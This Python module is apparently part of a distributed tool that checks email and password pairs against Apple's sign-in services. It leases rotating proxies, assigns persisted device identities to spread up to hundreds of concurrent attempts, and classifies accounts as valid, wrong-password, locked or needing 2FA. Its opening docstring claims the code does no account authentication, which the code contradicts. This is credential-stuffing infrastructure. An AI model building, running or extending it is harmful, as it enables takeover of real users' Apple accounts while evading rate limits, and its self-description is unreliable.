"""The only executor: offline line hashing, with optional synthetic delay.

No plugin loading, account authentication, shell commands or target URLs.
"""
from collections import deque
from concurrent.futures import ThreadPoolExecutor
import base64
import hashlib
import heapq
import ipaddress
import json
import multiprocessing as mp
import os
from pathlib import Path
import queue
import re
import shutil
import threading
import time
from urllib.parse import urlsplit

from .common import atomic_json


PROXY_ACQUIRE_WAIT_SECONDS = 5.0
PROXY_EMPTY_GRACE_SECONDS = 60.0
PROXY_RETRY_DELAY_SECONDS = 0.0
PROXY_REFILL_INTERVAL_SECONDS = 1.0
PROXY_WATERMARK_RATIO = 0.5
PROXY_HIGH_WATER_RATIO = 1.5
PROXY_TTL_SECONDS = 50.0
PROXY_LEASE_MARGIN_SECONDS = 8.0
# The proven “并发3” threading engine starts every worker immediately.  Its
# proxy supplier already absorbs the connection burst; adding an eight-second
# ramp here only makes the first progress window incomparable.
ACCOUNT_START_RAMP_SECONDS = 0.0
PROXY_ACCOUNTS_PER_LEASE = 6
MIN_STALL_TIMEOUT_SECONDS = 180.0
PROXY_DEBUG_ENV = 'CLUSTER_PROXY_DEBUG'
PROXY_EXIT_IP_URL = 'https://api.ipify.org?format=json'
PROXY_EXIT_IP_TIMEOUT = 4.0
PROXY_EXIT_IP_MAX = 2048
REGISTRATION_EXIT_IP_SKIPPED = '未回查'

_APPLE_REASON_KEYS = (
    ('unable to sign you in to your apple account. try again later', 'apple_signin_later'),
    ('this request could not be completed because of a server error', 'apple_server_error'),
    ('this action cannot be completed', 'apple_action_unavailable'),
    ('this action could not be completed. try again', 'apple_action_unavailable'),
    ('the request cannot be processed at this time. please try again later',
     'apple_processing_later'),
    ('we cannot process your request, please try again later', 'apple_processing_later'),
    ('this apple account has been locked for security reasons', 'account_locked_security'),
    ('this apple account has been locked', 'account_locked'),
    ('enter the correct password for this apple account', 'wrong_password'),
    ('this apple account is not active', 'account_not_active'),
    ('your account information was entered incorrectly', 'account_info_incorrect'),
    ('the account does not exist', 'account_not_found'),
)


class _WatermarkProxyPool:
    """Small task-local pool with fair reuse and one low-water refill path."""

    def __init__(self, fetch, target, low_water=None,
                 refill_interval=PROXY_REFILL_INTERVAL_SECONDS,
                 ttl=PROXY_TTL_SECONDS,
                 lease_margin=PROXY_LEASE_MARGIN_SECONDS):
        self.fetch = fetch
        self.target = max(1, int(target))
        self.low_water = max(1, int(low_water or self.target * PROXY_WATERMARK_RATIO))
        self.condition = threading.Condition()
        self.fresh = deque()
        # Reused exits are a least-used heap.  The former deque selected one
        # exit by scanning every known endpoint while holding the global pool
        # lock, which serialized workers after the fresh wave was exhausted.
        self.reusable = []
        self.reuse_order = 0
        self.known = set()
        self.leased = set()
        self.uses = {}
        self.expires = {}
        self.ttl = max(0.01, float(ttl))
        self.lease_margin = max(0.0, min(self.ttl - 0.001,
                                         float(lease_margin)))
        self.refilling = False
        self.refill_interval = max(0.0, float(refill_interval))
        self.next_refill_at = 0.0

    def bootstrap(self):
        """Fetch the configured thread count once before workers start."""
        self._refill(blocking=True)
        return self.snapshot()

    def acquire(self, wait=PROXY_ACQUIRE_WAIT_SECONDS):
        deadline = time.monotonic() + max(0.0, float(wait))
        with self.condition:
            while True:
                endpoint = None
                now = time.monotonic()
                # A returned lease has completed a real Apple request and is
                # therefore more valuable than an untested provider port.
                # Pick the least-used validated exit first; fresh inventory is
                # the reserve used when no validated exit is idle.
                while self.reusable and endpoint is None:
                    uses, _order, candidate = heapq.heappop(self.reusable)
                    if (candidate not in self.known or candidate in self.leased
                            or self.uses.get(candidate) != uses):
                        continue
                    if self.expires.get(candidate, 0.0) <= now + self.lease_margin:
                        self._forget_locked(candidate)
                        continue
                    endpoint = candidate
                while self.fresh and endpoint is None:
                    candidate = self.fresh.popleft()
                    if self.expires.get(candidate, 0.0) > now + self.lease_margin:
                        endpoint = candidate
                    else:
                        self._forget_locked(candidate)
                if endpoint is not None:
                    self.leased.add(endpoint)
                    count = self.uses.get(endpoint, 0)
                    self.uses[endpoint] = count + 1
                    return (endpoint, self.expires[endpoint], count)
                # Expired leases can remain inside a blocked request for tens
                # of seconds.  They are not usable inventory and must not stop
                # the supplier from replacing them.
                if self._live_known_locked(now) < self.target and not self.refilling:
                    self._start_refill_locked()
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    return None
                self.condition.wait(min(0.1, remaining))

    def release(self, lease, healthy=True):
        endpoint = lease[0] if lease else None
        if not endpoint:
            return
        with self.condition:
            self.leased.discard(endpoint)
            if (healthy and endpoint in self.known
                    and self.expires.get(endpoint, 0.0)
                    > time.monotonic() + self.lease_margin):
                heapq.heappush(self.reusable,
                               (self.uses.get(endpoint, 0), self.reuse_order,
                                endpoint))
                self.reuse_order += 1
            else:
                self._forget_locked(endpoint)
            self._ensure_watermark_locked()
            self.condition.notify_all()

    def discard(self, lease):
        self.release(lease, healthy=False)

    def snapshot(self):
        with self.condition:
            cutoff = time.monotonic() + self.lease_margin
            available = sum(1 for endpoint in self.known
                            if endpoint not in self.leased
                            and self.expires.get(endpoint, 0.0) > cutoff)
            return {'target': self.target, 'low_water': self.low_water,
                    'fresh': len(self.fresh), 'reusable': len(self.reusable),
                    'available': available,
                    'in_use': len(self.leased), 'known': len(self.known),
                    'refilling': self.refilling}

    def _forget_locked(self, endpoint):
        self.known.discard(endpoint)
        self.leased.discard(endpoint)
        self.uses.pop(endpoint, None)
        self.expires.pop(endpoint, None)

    def _live_known_locked(self, now=None):
        now = time.monotonic() if now is None else now
        cutoff = now + self.lease_margin
        return sum(1 for endpoint in self.known
                   if self.expires.get(endpoint, 0.0) > cutoff)

    def _available_live_locked(self, now=None):
        now = time.monotonic() if now is None else now
        cutoff = now + self.lease_margin
        return sum(1 for endpoint in self.known
                   if endpoint not in self.leased
                   and self.expires.get(endpoint, 0.0) > cutoff)

    def _ensure_watermark_locked(self):
        # Watermark means immediately borrowable inventory, not the size of
        # ``known``.  Counting busy or expired leases hid an empty pool under
        # 500-thread load and made every account wait for the old sockets.
        if (self._available_live_locked() < self.low_water
                and self._live_known_locked() < self.target
                and not self.refilling):
            self._start_refill_locked()

    def _start_refill_locked(self):
        self.refilling = True
        threading.Thread(target=self._refill, name='proxy-watermark-refill',
                         daemon=True).start()

    def _refill(self, blocking=False):
        if blocking:
            with self.condition:
                if self.refilling:
                    return
                self.refilling = True
        with self.condition:
            missing = max(0, self.target - self._live_known_locked())
            delay = max(0.0, self.next_refill_at - time.monotonic())
        if delay:
            time.sleep(delay)
        try:
            values = list(self.fetch(missing) or ()) if missing else []
        except Exception:                                          # noqa: BLE001
            values = []
        fetched_at = time.monotonic()
        with self.condition:
            self.next_refill_at = time.monotonic() + self.refill_interval
            # New endpoints always enter the fresh queue and are selected
            # before reusable ones. Identity is the complete provider string,
            # so equal IPs on different ports remain independent exits.
            for value in values:
                endpoint = str(value or '').strip()
                if endpoint and endpoint not in self.known:
                    self.known.add(endpoint)
                    self.expires[endpoint] = fetched_at + self.ttl
                    self.fresh.append(endpoint)
            self.refilling = False
            self.condition.notify_all()


class _ReferenceIpPoolAdapter:
    """Expose 并发3's process-local ``IpPool`` through the executor API.

    ``IpPool`` assigns one lock-free local deque to every worker id and keeps a
    single shared refill queue.  This adapter only translates lease tuples; it
    deliberately leaves warmup, low/high watermarks, TTL and supplier cadence
    to the reference implementation.
    """

    def __init__(self, fetch, workers, ttl=PROXY_TTL_SECONDS,
                 lease_margin=PROXY_LEASE_MARGIN_SECONDS):
        from gsafast.ippool import IpPool
        self.workers = max(1, int(workers))
        self.lease_margin = float(lease_margin)
        self._pool = IpPool(
            'http://reference.invalid/?num={num}', threads=self.workers,
            ttl=ttl, per_ip=PROXY_ACCOUNTS_PER_LEASE, batch=1000,
            refill_interval=1.0, lease_margin=lease_margin, rotate=False)
        # Keep the exact reference queue/supplier implementation while using
        # cluster-lab's already validated API parser and scheme normalization.
        def safe_fetch(count):
            try:
                return list(fetch(int(count)) or ())
            except Exception:                                      # noqa: BLE001
                return []
        self._pool._fetch = safe_fetch
        self._tid_lock = threading.Lock()
        self._thread_ids = {}
        self._next_tid = 0
        self._active = 0
        self._uses = {}

    def _tid(self):
        ident = threading.get_ident()
        with self._tid_lock:
            tid = self._thread_ids.get(ident)
            if tid is None:
                tid = self._next_tid % self.workers
                self._next_tid += 1
                self._thread_ids[ident] = tid
            return tid

    def bootstrap(self):
        self._pool.warm(extra=1)
        self._pool.start()
        return self.snapshot()

    def acquire(self, wait=PROXY_ACQUIRE_WAIT_SECONDS):
        tid = self._tid()
        endpoint, expires = self._pool.acquire(tid, wait=wait)
        if not endpoint:
            return None
        with self._tid_lock:
            used = self._uses.get(endpoint, 0)
            self._uses[endpoint] = used + 1
            self._active += 1
        return endpoint, expires, used, tid

    def release(self, lease, healthy=True):
        if not lease:
            return
        endpoint, expires = lease[0], lease[1]
        tid = int(lease[3]) if len(lease) > 3 else self._tid()
        with self._tid_lock:
            self._active = max(0, self._active - 1)
        self._pool.release(tid, endpoint, expires, healthy=healthy)

    def discard(self, lease):
        self.release(lease, healthy=False)

    def snapshot(self):
        value = self._pool.snapshot()
        with self._tid_lock:
            active = self._active
        return {
            **value,
            'target': int(value.get('initial_max') or self.workers),
            'known': int(value.get('tracked') or 0),
            'in_use': active,
            'fresh': int(value.get('available') or 0),
            'reusable': int(value.get('local_live') or 0),
            'refilling': False,
        }

    def stop(self):
        self._pool.stop()


def _proxy_watermarks(workers):
    """Match the proven standalone 500-thread pool: low 250, high 750."""
    workers = max(1, int(workers))
    return (max(1, int(workers * PROXY_WATERMARK_RATIO)),
            max(workers, int(workers * PROXY_HIGH_WATER_RATIO)))


def stall_timeout_seconds(descriptor, minimum=MIN_STALL_TIMEOUT_SECONDS,
                          padding=60.0):
    """Return a no-progress budget larger than every configured retry."""
    timeout = max(0.1, float(descriptor.get('timeout') or 25))
    retries = descriptor.get('retries')
    attempts = max(0, int(2 if retries is None else retries)) + 1
    return max(float(minimum), timeout * attempts + float(padding))


def _gsa_per_hop_timeout(configured_timeout, remaining_attempt_time):
    """Match 并发3: every GSA hop receives the configured timeout.

    Dividing 25 seconds across SOCKS connect/read and both GSA hops produced a
    6.25-second requests timeout. Healthy provider exits routinely need more
    than that for one phase, so the split turned successful work into long
    retry chains. The reference engine passes the full per-hop value and only
    checks the per-attempt deadline after each result.
    """
    configured = max(0.001, float(configured_timeout))
    remaining = max(0.001, float(remaining_attempt_time))
    return max(0.001, min(configured, remaining))


def _partition_device_slots(slot_ids, process_count, process_index):
    """Give each process one balanced, disjoint slice of persisted devices."""
    slots = [int(value) for value in slot_ids]
    count = max(1, int(process_count))
    index = max(0, min(count - 1, int(process_index)))
    width, extra = divmod(len(slots), count)
    start = index * width + min(index, extra)
    size = width + int(index < extra)
    return slots[start:start + size] or [index + 1]


class _ProcessOwnedDevicePool:
    """Restrict one process to its assigned device files and preload them."""

    def __init__(self, delegate, slot_ids):
        self.delegate = delegate
        self.slot_ids = tuple(int(value) for value in slot_ids)
        self.owned = frozenset(self.slot_ids)

    def _check(self, slot):
        slot = int(slot)
        if slot not in self.owned:
            raise ValueError(f'device slot {slot} is not owned by this process')
        return slot

    def slot_directory(self, slot):
        return self.delegate.slot_directory(self._check(slot))

    def inspect(self, slot):
        return self.delegate.inspect(self._check(slot))

    def reset(self, slot):
        """Retire one owned identity even when fastcheck lacks legacy reset()."""
        value = self._check(slot)
        legacy = getattr(self.delegate, 'reset', None)
        if callable(legacy):
            return legacy(value)
        states = getattr(self.delegate, '_memory_states', None)
        lock = getattr(self.delegate, '_memory_states_lock', None)
        if isinstance(states, dict):
            if lock is not None:
                with lock:
                    states.pop(value, None)
            else:
                states.pop(value, None)
        shutil.rmtree(self.delegate.slot_directory(value), ignore_errors=True)
        return True

    def fetch_headers(self, slot, *args, **kwargs):
        return self.delegate.fetch_headers(self._check(slot), *args, **kwargs)

    def preload(self):
        """Load only owned persisted device states into this process's memory."""
        return {slot: self.inspect(slot) for slot in self.slot_ids}

    def __getattr__(self, name):
        return getattr(self.delegate, name)


class _ProcessDeviceAllocator:
    """Least-used exclusive device checkout with no network work under lock."""

    def __init__(self, states, initial_uses=None):
        self.states = dict(states)
        self.uses = {slot: max(0, int((initial_uses or {}).get(slot, 0)))
                     for slot in self.states}
        self.condition = threading.Condition()
        self.available = [(self.uses[slot], order, slot)
                          for order, slot in enumerate(self.states)]
        heapq.heapify(self.available)
        self.in_use = set()
        self.order = len(self.available)

    def acquire(self, stop=None):
        with self.condition:
            while not self.available:
                if stop is not None and stop.is_set():
                    return None
                self.condition.wait(0.05)
            _uses, _order, slot = heapq.heappop(self.available)
            self.in_use.add(slot)
            # Count the checkout immediately so concurrent threads distribute
            # evenly even before the account request finishes.
            self.uses[slot] += 1
            return self.states[slot]

    def release(self, state):
        slot = int(state['slot'])
        with self.condition:
            if slot not in self.in_use:
                return
            self.in_use.remove(slot)
            heapq.heappush(self.available, (self.uses[slot], self.order, slot))
            self.order += 1
            self.condition.notify()

    def reset_usage(self, slot, value=0):
        with self.condition:
            self.uses[int(slot)] = max(0, int(value))

    def snapshot(self):
        with self.condition:
            return {'owned': len(self.states), 'available': len(self.available),
                    'in_use': len(self.in_use), 'uses': dict(self.uses)}


def _slot_for_account(account, slot_ids):
    """Map one account to a stable, evenly distributed device slot."""
    slots = [int(value) for value in slot_ids]
    if not slots:
        raise ValueError('device slot list is empty')
    digest = hashlib.sha256(str(account or '').strip().casefold().encode('utf-8')).digest()
    prefix = base64.urlsafe_b64encode(digest).decode('ascii').rstrip('=')[:8]
    return slots[int.from_bytes(digest[:8], 'big') % len(slots)], 'B64:' + prefix


def _device_id_label(device_id):
    """Return the same short, non-secret device identifier used by the node UI."""
    raw = str(device_id or '').encode('utf-8')
    return ('B64:' + base64.urlsafe_b64encode(raw).decode('ascii').rstrip('=')[:8]
            if raw else '')


def _proxy_debug_enabled(descriptor=None):
    # A controller-supplied value is authoritative, including explicit False.
    # This lets the system setting turn logging off even when an older node
    # service still has CLUSTER_PROXY_DEBUG=1 in its environment.
    if descriptor is not None and '_proxy_debug' in descriptor:
        return bool(descriptor.get('_proxy_debug'))
    value = os.environ.get(PROXY_DEBUG_ENV, '')
    return str(value).strip().lower() in ('1', 'true', 'yes', 'on')


def _proxy_identity(value):
    """Return a credential-free endpoint identity for diagnostics."""
    if not value:
        return {'endpoint': '', 'host': '', 'port': None}
    try:
        parsed = urlsplit(str(value))
        host, port = (parsed.hostname or ''), parsed.port
    except (TypeError, ValueError):
        host, port = '', None
    endpoint = f'{host}:{port}' if host and port is not None else host
    return {'endpoint': endpoint[:160], 'host': host[:128], 'port': port}


def _proxy_pool_snapshot(pool):
    if pool is None:
        return {}
    try:
        return pool.snapshot()
    except Exception:                                               # noqa: BLE001
        return {}


def _proxy_debug_detail(value):
    text = str(value or '')
    text = re.sub(r'(?i)((?:https?|socks5h?)://)[^/@\s]+@', r'\1***@', text)
    text = re.sub(r'(?i)(password|passwd|pwd|token|key)=([^&\s]+)', r'\1=***', text)
    return text[:240]


def _apple_reason_key(result, status=''):
    """Reduce a verbose Apple/transport reason to one bounded wire identifier."""
    text = ' '.join(str(result.get(key) or '').strip()
                    for key in ('apple_message', 'reason', 'detail')).casefold()
    for phrase, key in _APPLE_REASON_KEYS:
        if phrase in text:
            return key
    try:
        http = int(result.get('http'))
    except (TypeError, ValueError):
        http = None
    try:
        apple_ec = int(result.get('apple_ec'))
    except (TypeError, ValueError):
        apple_ec = None
    if http == 0:
        return 'transport_timeout'
    if http == 503:
        return 'service_unavailable'
    if apple_ec == -20970 and not str(result.get('apple_message') or result.get('reason') or '').strip():
        return 'gsa_20970_unlabelled'
    if apple_ec in (-22421, -22410, -332000, -33200, -3000303):
        return 'apple_transient_code'
    return '' if status in ('valid', 'wrong_password', 'need_2fa', 'locked', 'not_found') else 'unknown'


def _apple_reason_for_record(result, status, debug=False):
    """Return one bounded raw Apple reason for an opted-in detailed task."""
    if not debug:
        return ''
    message = result.get('apple_message')
    if isinstance(message, str) and message.strip():
        return message.strip()[:240]
    return ''


def _repair_probe_method(web_result, trace):
    """Translate one supplemental IDMSA result without changing GSA truth.

    ``au=repair`` is an umbrella GSA continuation.  IDMSA's complete response
    is more specific, but only an explicit hsa/hsa2 challenge may be called a
    verification-code flow.  HTTP 412 / ``needs_setup`` remains a security or
    repair flow even when it carries an hsa-looking authType.
    """
    result = web_result if isinstance(web_result, dict) else {}
    metadata = trace.get('complete') if isinstance(trace, dict) else None
    metadata = metadata if isinstance(metadata, dict) else {}
    auth_type = str(metadata.get('auth_type') or '').strip().casefold()
    web_status = str(result.get('status') or '').strip().casefold()
    if web_status == 'need_2fa' and auth_type in ('hsa', 'hsa2'):
        return 'verification_code'
    if auth_type in ('sa', 'non-sa', 'dnu') or web_status == 'needs_setup':
        return 'security_repair'
    return 'repair_unspecified'


def _refine_repair_auth(result, email, password, proxy, timeout, cancel,
                        retries=0, checker=None):
    """Probe IDMSA once only after a verified GSA ``au=repair`` response.

    The GSA result remains authoritative.  A failed supplemental request never
    turns a password-verified account into an error or a retry outcome.
    """
    if (not isinstance(result, dict)
            or result.get('status') != 'need_2fa'
            or str(result.get('auth_type') or '').strip().casefold() != 'repair'):
        return result
    if checker is None:
        from fastcheck.protocols.idmsa import check as checker
    trace = {}

    def remember(event):
        if not isinstance(event, dict):
            return
        stage = str(event.get('stage') or '')
        if stage in ('init', 'complete'):
            metadata = {
                'http': event.get('http'),
                'auth_type': event.get('auth_type'),
                'attempt': event.get('attempt'),
                'server': str(event.get('server') or '')[:128],
                'via': str(event.get('via') or '')[:128],
                'retry_after': str(event.get('retry_after') or '')[:64],
                'content_type': str(event.get('content_type') or '')[:128],
                'response_body_bytes': event.get('response_body_bytes'),
                'response_body_sha256': str(event.get('response_body_sha256') or '')[:64],
                'response_keys': list(event.get('response_keys') or [])[:32],
                'service_error_codes': list(event.get('service_error_codes') or [])[:16],
                'has_session_headers': bool(event.get('has_session_headers')),
                'has_set_cookie': bool(event.get('has_set_cookie')),
            }
            trace[stage] = metadata
            trace['latest'] = metadata

    try:
        web_result = checker(email, password, proxy, timeout=timeout,
                             retries=max(0, int(retries or 0)),
                             cancel=cancel, trace=remember)
    except Exception as exc:                                      # noqa: BLE001
        # Persist only the exception class.  Exception messages from HTTP
        # libraries may contain proxy URLs (and therefore credentials).
        web_result = {'status': 'error', 'kind': type(exc).__name__,
                      'detail': type(exc).__name__}
    web_result = web_result if isinstance(web_result, dict) else {}
    latest = (trace.get('latest') if isinstance(trace.get('latest'), dict)
              else trace.get('complete') if isinstance(trace.get('complete'), dict)
              else trace.get('init') if isinstance(trace.get('init'), dict)
              else {})
    complete = trace.get('complete') if isinstance(trace.get('complete'), dict) else {}
    enriched = dict(result)
    enriched.update(
        two_factor_method=_repair_probe_method(web_result, trace),
        web_auth_type=str(complete.get('auth_type') or '')[:32],
        web_http=latest.get('http'),
        web_status=str(web_result.get('status') or '')[:32],
        web_stage=str(web_result.get('stage') or
                      ('complete' if complete else 'init' if latest else ''))[:32],
        web_kind=str(web_result.get('kind') or '')[:64],
        web_detail=str(web_result.get('detail') or '')[:256],
        web_attempts=max(0, int(latest.get('attempt') or 0)),
        web_server=latest.get('server') or '',
        web_via=latest.get('via') or '',
        web_retry_after=latest.get('retry_after') or '',
        web_content_type=latest.get('content_type') or '',
        web_response_bytes=latest.get('response_body_bytes'),
        web_response_sha256=latest.get('response_body_sha256') or '',
        web_response_keys=(latest.get('response_keys') or []) if latest else None,
        web_service_error_codes=(latest.get('service_error_codes') or []) if latest else None,
        web_has_session_headers=bool(latest.get('has_session_headers')) if latest else None,
        web_has_set_cookie=bool(latest.get('has_set_cookie')) if latest else None,
    )
    # Web sa/non-sa proves the password and belongs in the password-correct
    # bucket even when GSA used its broad au=repair continuation.
    if (str(complete.get('auth_type') or '').strip().casefold() in ('sa', 'non-sa')
            and str(web_result.get('status') or '').strip().casefold()
            in ('valid', 'needs_setup')):
        enriched['status'] = 'valid'
    return enriched


def _refine_repair_auth_with_rotation(result, email, password, proxy, timeout,
                                      cancel, retries, rotate_proxy, checker=None,
                                      deadline=None):
    """Retry transient Web HTTP 0/5xx checks on newly acquired exits.

    GSA is deliberately not repeated because its ``au=repair`` result is
    already authoritative; only the supplemental Web request is retried.
    """
    current_proxy = proxy
    refined = result
    attempts = 0
    rotations = 0
    exhausted = False
    limit = max(0, int(retries or 0)) + 1
    for attempt in range(limit):
        remaining = (float(deadline) - time.time()
                     if deadline is not None else float(timeout))
        if remaining <= 0:
            break
        attempts += 1
        refined = _refine_repair_auth(
            result, email, password, current_proxy,
            max(0.1, min(float(timeout), remaining)), cancel,
            retries=0, checker=checker)
        try:
            web_http = int(refined.get('web_http'))
        except (TypeError, ValueError):
            web_http = None
        transient = (str(refined.get('web_status') or '').casefold() == 'error'
                     and web_http in (0, 500, 502, 503, 504))
        if not transient or attempt + 1 >= limit or (cancel and cancel()):
            break
        current_proxy, available = rotate_proxy(attempt + 1)
        if not available:
            exhausted = True
            break
        rotations += 1
    if isinstance(refined, dict) and refined is not result:
        refined['web_attempts'] = attempts
        refined['web_proxy_rotations'] = rotations
        if exhausted:
            refined['web_rotation_exhausted'] = True
    return refined


def _write_proxy_debug(path, event, **fields):
    """Append one bounded JSONL event without ever persisting proxy credentials."""
    if not path:
        return
    payload = {'at': round(time.time(), 6), 'event': str(event),
               'pid': os.getpid(), 'thread': threading.current_thread().name}
    payload.update(fields)
    raw = (json.dumps(payload, ensure_ascii=False, separators=(',', ':'),
                      default=str) + '\n').encode('utf-8')
    # One O_APPEND write keeps concurrent worker lines intact.  Truncate large
    # exception details before this helper so a single event remains bounded.
    fd = os.open(str(path), os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    try:
        os.write(fd, raw)
    finally:
        os.close(fd)


def _probe_proxy_exit_ip(proxy, timeout=PROXY_EXIT_IP_TIMEOUT, url=None):
    """Return the public exit IP observed through one proxy endpoint."""
    import requests

    value = str(proxy or '')
    if not value:
        raise ValueError('missing proxy endpoint')
    response = requests.get(
        url or os.environ.get('CLUSTER_PROXY_DEBUG_IP_URL') or PROXY_EXIT_IP_URL,
        proxies={'http': value, 'https': value},
        timeout=max(0.5, float(timeout)), allow_redirects=False,
        headers={'User-Agent': 'clusterlab-proxy-debug/1'},
    )
    response.raise_for_status()
    try:
        payload = response.json()
    except ValueError:
        candidate = response.text.strip()
    else:
        candidate = str(payload.get('ip') or '').strip() if isinstance(payload, dict) else ''
    if not candidate:
        raise ValueError('exit IP response is empty')
    return str(ipaddress.ip_address(candidate))


class _ProxyExitIpDebug:
    """Bounded asynchronous exit-IP sampler used only by debug-mode workers."""

    def __init__(self, path, probe=None, limit=None, workers=4):
        configured = os.environ.get('CLUSTER_PROXY_DEBUG_IP_MAX')
        try:
            requested = int(configured if limit is None and configured else
                            (PROXY_EXIT_IP_MAX if limit is None else limit))
        except (TypeError, ValueError):
            requested = PROXY_EXIT_IP_MAX
        self.path = path
        self.limit = max(1, min(10000, requested))
        self.probe = probe or _probe_proxy_exit_ip
        self.queue = queue.Queue(maxsize=self.limit)
        self.lock = threading.Lock()
        self.seen = set()
        self.attempt_results = {}
        self.switches = set()
        self.submitted = 0
        self.completed = 0
        self.errors = 0
        self.skipped = 0
        self.closed = False
        self.threads = []
        for index in range(max(1, min(4, int(workers or 1)))):
            thread = threading.Thread(target=self._run,
                                      name=f'proxy-exit-ip-{index}', daemon=True)
            thread.start()
            self.threads.append(thread)

    def submit(self, proxy, trigger, **fields):
        identity = _proxy_identity(proxy)
        endpoint = identity['endpoint']
        if not endpoint:
            return False
        sample_key = (endpoint, str(trigger), fields.get('row'),
                      fields.get('slot'), fields.get('attempt'))
        with self.lock:
            if self.closed or sample_key in self.seen:
                return False
            if len(self.seen) >= self.limit:
                self.skipped += 1
                return False
            self.seen.add(sample_key)
            self.submitted += 1
        item = (str(proxy), identity, {'trigger': str(trigger), **fields})
        try:
            self.queue.put_nowait(item)
        except queue.Full:
            with self.lock:
                self.skipped += 1
            _write_proxy_debug(self.path, 'exit_ip_probe_skipped',
                               endpoint=identity['endpoint'], host=identity['host'],
                               port=identity['port'], reason='queue_full')
            return False
        return True

    def _run(self):
        while True:
            item = self.queue.get()
            try:
                if item is None:
                    return
                proxy, identity, fields = item
                started = time.monotonic()
                try:
                    exit_ip = self.probe(proxy)
                    elapsed = round((time.monotonic() - started) * 1000, 2)
                    _write_proxy_debug(
                        self.path, 'exit_ip_probe', probe_status='ok',
                        exit_ip=exit_ip, probe_ms=elapsed,
                        endpoint=identity['endpoint'], host=identity['host'],
                        port=identity['port'], **fields)
                    self._record_attempt(identity, fields, 'ok', exit_ip)
                    with self.lock:
                        self.completed += 1
                except Exception as exc:                          # noqa: BLE001
                    elapsed = round((time.monotonic() - started) * 1000, 2)
                    _write_proxy_debug(
                        self.path, 'exit_ip_probe', probe_status='error',
                        exit_ip='', probe_ms=elapsed,
                        endpoint=identity['endpoint'], host=identity['host'],
                        port=identity['port'], error_type=type(exc).__name__,
                        detail=_proxy_debug_detail(exc), **fields)
                    self._record_attempt(identity, fields, 'error', '')
                    with self.lock:
                        self.errors += 1
            finally:
                self.queue.task_done()

    def _record_attempt(self, identity, fields, status, exit_ip):
        row, slot, attempt = (fields.get('row'), fields.get('slot'),
                              fields.get('attempt'))
        if row is None or slot is None or attempt is None:
            return
        key = (row, slot, int(attempt))
        current = {'endpoint': identity['endpoint'], 'host': identity['host'],
                   'port': identity['port'], 'exit_ip': exit_ip,
                   'probe_status': status}
        pairs = []
        with self.lock:
            self.attempt_results[key] = current
            for left_attempt in (int(attempt) - 1, int(attempt)):
                if left_attempt < 0:
                    continue
                pair_key = (row, slot, left_attempt, left_attempt + 1)
                left = self.attempt_results.get((row, slot, left_attempt))
                right = self.attempt_results.get((row, slot, left_attempt + 1))
                if left is None or right is None or pair_key in self.switches:
                    continue
                self.switches.add(pair_key)
                pairs.append((left_attempt, left, right))
        for left_attempt, left, right in pairs:
            verified = (left['probe_status'] == 'ok' and
                        right['probe_status'] == 'ok')
            _write_proxy_debug(
                self.path, 'exit_ip_switch', row=row, slot=slot,
                from_attempt=left_attempt, to_attempt=left_attempt + 1,
                previous_endpoint=left['endpoint'], endpoint=right['endpoint'],
                previous_exit_ip=left['exit_ip'], exit_ip=right['exit_ip'],
                previous_probe_status=left['probe_status'],
                probe_status=right['probe_status'], verified=verified,
                gateway_changed=left['endpoint'] != right['endpoint'],
                port_changed=left['port'] != right['port'],
                exit_ip_changed=(left['exit_ip'] != right['exit_ip']
                                 if verified else None))

    def snapshot(self):
        with self.lock:
            return {'limit': self.limit, 'submitted': self.submitted,
                    'completed': self.completed, 'errors': self.errors,
                    'skipped': self.skipped, 'pending': self.queue.unfinished_tasks}

    def close(self, timeout=10.0):
        with self.lock:
            self.closed = True
        deadline = time.monotonic() + max(0.0, float(timeout))
        while self.queue.unfinished_tasks and time.monotonic() < deadline:
            time.sleep(0.02)
        for _thread in self.threads:
            try:
                self.queue.put_nowait(None)
            except queue.Full:
                break
        for thread in self.threads:
            thread.join(max(0.0, deadline - time.monotonic()))


def execute_unit(directory, descriptor, stop):
    directory = Path(directory)
    started = time.time()
    processed = 0
    output_path = directory / 'results.jsonl'
    output_digest = hashlib.sha256()

    def transform(item):
        row, line = item
        raw = line.rstrip(b'\r\n')
        if descriptor['mode'] == 'simulate':
            # The override is used by the local soak verifier to keep a large
            # test running long enough to observe dispatch and 1 Hz reports.
            delay = float(os.environ.get('CLUSTER_LAB_SIMULATE_DELAY', '0.004'))
            time.sleep(max(0.0, min(delay, 10.0)))
        # account 保留原始记录，供总控逐行核对；status 是分类结果。
        # 离线摘要没有业务判定，统一记为 valid，接入真实执行器后由执行器给值。
        record = {'row': row, 'account': raw.decode('utf-8', 'replace')[:512],
                  'status': 'valid', 'sha256': hashlib.sha256(raw).hexdigest(), 'bytes': len(raw)}
        return (json.dumps(record, separators=(',', ':')) + '\n').encode()

    try:
        with (directory / 'input.part').open('rb') as source, output_path.open('wb') as output:
            output_path.chmod(0o600)
            with ThreadPoolExecutor(max_workers=descriptor['threads']) as pool:
                pending = deque()
                next_row = descriptor['first_row']
                exhausted = False
                last_progress = 0
                while not exhausted or pending:
                    if stop.is_set():
                        raise InterruptedError('租约失效或节点关闭')
                    while not exhausted and len(pending) < descriptor['threads'] * 2:
                        line = source.readline(65537)
                        if not line:
                            exhausted = True
                            break
                        if len(line) > 65536:
                            raise ValueError('输入记录过长')
                        pending.append(pool.submit(transform, (next_row, line)))
                        next_row += 1
                    if pending:
                        result = pending.popleft().result()
                        output.write(result)
                        output_digest.update(result)
                        processed += 1
                    if time.monotonic() - last_progress > 0.25:
                        # Make complete JSONL lines visible to the node agent.
                        # Only the node heartbeat reports them; worker processes
                        # never contact the controller directly.
                        output.flush()
                        atomic_json(directory / 'progress.json',
                                    {'processed': processed, 'started': started,
                                     'counts': {'valid': processed}})
                        last_progress = time.monotonic()
            output.flush()
        if processed != descriptor['rows']:
            raise ValueError('输入条数和工作包描述不一致')
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started,
                     'counts': {'valid': processed}})
        atomic_json(directory / 'done.json', {'ok': True, 'processed': processed,
                    'counts': {'valid': processed},
                    'checksum': output_digest.hexdigest(), 'elapsed': time.time() - started})
    except Exception as exc:
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started,
                     'counts': {'valid': processed}})
        atomic_json(directory / 'done.json', {'ok': False, 'processed': processed, 'error': type(exc).__name__})


def _group_child(directory, descriptor, stop, proxy_pool=None):
    # 与并发3一致：认证进程保持系统默认调度优先级。旧实现在
    # 两层 multiprocessing 子进程中各 nice(+5) 一次，实际工作进程变成
    # nice=10，与参照运行时的 nice=0 不一致。
